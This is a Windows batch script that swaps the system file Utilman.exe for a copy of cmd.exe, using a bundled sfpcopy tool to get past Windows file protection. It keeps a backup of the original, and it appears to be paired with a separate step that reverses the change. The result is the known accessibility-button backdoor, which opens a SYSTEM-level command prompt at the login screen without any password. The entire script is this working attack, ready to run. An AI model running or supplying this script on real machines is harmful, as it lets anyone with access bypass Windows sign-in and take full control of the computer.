@echo off

if exist ".\files\original_file" (
    echo.
    echo Error: original_file folder exits, make sure you have operated disabling before.
    echo This window will be closed in 5 seconds.
    echo.
    exit /b 1
)

if exist ".\files\Utilman.exe" (
    echo.
    echo Error: Utilman.exe exits, make sure you have operated disabling before.
    echo This window will be closed in 5 seconds.
    echo.
    exit /b 1
)

mkdir files
mkdir files\original_file

copy C:\Windows\System32\Utilman.exe .\files\original_file\Utilman.exe
copy C:\Windows\System32\cmd.exe .\files\Utilman.exe

.\tools\sfpcopy.exe -q .\files\Utilman.exe C:\Windows\System32\Utilman.exe

echo.
if %ERRORLEVEL% EQU 0 (
    echo Success.
    echo This window will be closed in 5 seconds.
    echo.
) else (
    echo Fail, error code: %ERRORLEVEL%.
    echo This window will be closed in 5 seconds.
    echo.
)